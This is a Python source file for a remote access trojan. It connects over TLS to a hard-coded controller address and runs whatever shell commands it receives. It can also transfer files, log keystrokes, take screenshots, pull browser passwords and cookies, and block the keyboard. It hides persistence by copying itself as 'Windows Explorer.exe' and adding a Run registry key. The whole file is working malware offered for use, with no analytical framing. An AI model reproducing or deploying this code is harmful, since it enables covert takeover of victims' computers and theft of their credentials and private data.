import socket
import subprocess,json
import os
import base64
import ssl
import pyautogui
import tempfile
import keyboard
import sys
import shutil
from Browser import browser
from Keylogger import keylogger

class Backdoor:
    def __init__(self,ip,port):
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.context.minimum_version = ssl.TLSVersion.TLSv1_2
        self.context.maximum_version = ssl.TLSVersion.TLSv1_3
        certificate="""-----BEGIN CERTIFICATE-----
MIIFbTCCA1UCFEJ8NWZeuztRhYmohv/cvc3CeKUjMA0GCSqGSIb3DQEBCwUAMHMx
CzAJBgNVBAYTAklOMQ4wDAYDVQQIDAVzbWl0azEOMAwGA1UEBwwFc21pdGsxDjAM
BgNVBAoMBXNtaXRrMQ4wDAYDVQQLDAVzbWl0azEOMAwGA1UEAwwFc21pdGsxFDAS
BgkqhkiG9w0BCQEWBXNtaXRrMB4XDTI0MDQyOTE4MDUyM1oXDTI0MDUyOTE4MDUy
M1owczELMAkGA1UEBhMCSU4xDjAMBgNVBAgMBXNtaXRrMQ4wDAYDVQQHDAVzbWl0
azEOMAwGA1UECgwFc21pdGsxDjAMBgNVBAsMBXNtaXRrMQ4wDAYDVQQDDAVzbWl0
azEUMBIGCSqGSIb3DQEJARYFc21pdGswggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAw
ggIKAoICAQC2lPpSUi8Uvo5CGpH9j9fmO6qQOM+zfzSp2hThznwZNJXxprqnZ2Y2
FKvnOKdrHn1ew09s/atWHSMBlssAdquofxh3h35MNwg0Ku8F4sCUzd/+75SYJGSM
O4EOgaCv6XHGBgCKVhl1Zrf/SSNAp3GJT2L+6lIIWHJWDiVVUoU5T6/hVKwCb9A7
eYPKB092lEiQqfBII/uSSwYzbi2TViQPcH0mEVr3N9LN+vUEWrazg9zCoobCYmKG
QUno49TDEyxWKORMOc79eyLUsR7tKMP0esa4yofwkgnqaGWIlvug+grfHZR70NoJ
wP0vYbDDYNajAUpgP25tag+NhfWgFdwPDLyjIEbkCOFczuv8BUb3/41j11+bVcSo
pTv1Uc0LYfESjGidh9WAt6pxlPVokS9UyeQPTZbIHGvEEj/ZckEIQtIU6me57JN2
xHTkDzz5q8odJS2b1WiefgjMfU7mbgndDySgGj1/Q3N418ltfPpBYpQ60Ez8kgcD
YVfHr1+ybMv32VrINXhKkV8RBLpa9PzgQZl9hSwCwW9fFuQ8IyWryE0+GWJiRTwh
B4ThPbclt4n5uCT1gJ212TdCYwvySOeHjCdB4edXwSDi5zPQrwiMEpFBc3rHKiYM
oM/yF7yop66c6Niwg1dAqsVpOww0Xlkc0aw+FWZf1sDquZvvG6jSMwIDAQABMA0G
CSqGSIb3DQEBCwUAA4ICAQAdCLRkDRW2AIwv2oTOnUPwZmn5ealHkOrxVu/744wa
ENrO5sZYyCUwdrRlg9JHtmz2uEVIwffRZ07Ncnz/TRwj0nVtf/xInEimsaH0135f
ajEQp+JUqMsuIg7lpqKSseB13O61KRvMmBj5P/4xmanXDyNhAtUT7lzCEbG9I8qL
ttCk2JFnG1Hr2MivCU1BHPbQ+JFvR0G80D7hJkS4xmJIyWVNcM/j4R2M40s1u/HX
YwObazsyOP0Hk9GmiDi6OVAKToxTY059dYPWEXTMRY0DfGiRgA1yuw95g61US8od
ge8l6mruAe2IALUN3qmQWiWMmU1F1SMu/da/il8Sj1yA3ypp7Cmdh1x/mruLi0lR
ta0Bkle/rLSyR2ZeYHuH1lm59C7OIUetiQpMsWM4k895/UItWSMsGAM9jC9kaSZL
JpRMxYvAEOP7vK44K3OfosOMHnCtL6OKvF83fwlxwBPkwQhz9khG5+epiACkSuoz
DOnl50OsQUwcdieBwjOLvDELkae3iyc5UltRiAy8mzyjVPjAknf/ELrUQZNPnK+5
uILUthkgdGdyfL4/HFIjqbArZg39hHk6k2619duMsMQWMgEPbXG2O1J6RnR4/DgP
1zcxGKkdLR0J9c7N0Y9PgPT9Emynn2ZQEN1MHAMT+vjqpUoor/bxz7f35IhZbFrm
FA==
-----END CERTIFICATE-----
"""
        self.context.load_verify_locations(cadata=certificate)
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
        self.connection.connect((ip,port))
        self.Send("bakara")
        # self.add_persistent()
        # self.keylogger_thread=None
    
    def BrowserData(self,type):
        br=browser()
        if type=='passwords':
            return br.GetPasswords()
        elif type=='cookies':
            return br.GetCookies()
        return '[-] Invalid Browser Command'
    
    def Send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    
    def Receive(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def AddStartUp(self):
        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
            return "[+] Persistence added successfully"
        else:
            return "[-] Persistence already exists"
    
    def RemoveStartUp(self):
        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        if os.path.exists(evil_file_location):
            os.remove(evil_file_location)
            subprocess.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',shell=True)
            return "[+] Persistence removed successfully"
        else:
            return "[-] Persistence does not exist"    
    
    def CD_Command(self,path):
        os.chdir(path)
        return "[+] Changing working directory to "+path    
    
    def RunShellCommand(self,command):
        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
    
    def ReadFile(self, path):
        with open(path, "rb") as file:
            binary_data = file.read()
            return base64.b64encode(binary_data).decode("utf-8")   
        
    def WriteFile(self,path,content):
        content=base64.b64decode(content)
        with open(path,"wb") as file:
            file.write(content)
            return "[+] Upload successful"
    
    def KeyLogger(self,command):
        if command == "on":
            self.keylogger=keylogger()
            return self.keylogger.on()
        elif command == "off":
            return self.keylogger.off()
        elif command=="report":
            return self.keylogger.report()
        else:
            return "[-] Invalid command"
            
    def Screenshot(self):
        screenshot = pyautogui.screenshot()
        temp_directory = tempfile.gettempdir()
        current_working_directory = os.getcwd()
        os.chdir(temp_directory)
        file_path="screenshot.png"
        screenshot.save(file_path)
        taken_screenshot=self.ReadFile(file_path)
        os.remove(file_path)
        os.chdir(current_working_directory)
        return taken_screenshot
            
    def DisableKeyboard(self):
        for i in range(150):
            keyboard.block_key(i)
        return "[+] Keyboard disabled"
    
    def EnableKeyboard(self):
        for i in range(150):
            keyboard.unblock_key(i)
        return "[+] Keyboard enabled"
        
    def run(self):
        while True:
            try:
                command=self.Receive()
                if command[0]=="exit":
                    self.Send("[-] Exiting")
                    self.connection.close()
                    sys.exit()
                if command[0]=="persistent":
                    if command[1]=="add":
                        command_result=self.AddStartUp()
                    elif command[1]=="remove":
                        command_result=self.RemoveStartUp()
                elif command[0]=="cd" and len(command)>1:
                    command_result=self.CD_Command(command[1])
                elif command[0]=="download":
                    command_result=self.ReadFile(command[1])
                elif command[0]=="upload":
                    command_result=self.WriteFile(command[1],command[2])
                elif command[0]=="keylogger":
                    command_result=self.KeyLogger(command[1])
                elif command[0]=="screenshot":
                    command_result=self.Screenshot()
                elif command[0]=="browser":
                    command_result=self.BrowserData(command[1])
                else:
                    command_result=self.RunShellCommand(command).decode("utf-8")
            except Exception as e:
                command_result="[-] Bakara ERR : \n%s"%str(e)
            self.Send(command_result)

my_backdoor=Backdoor("192.168.56.1",8080)
my_backdoor.run()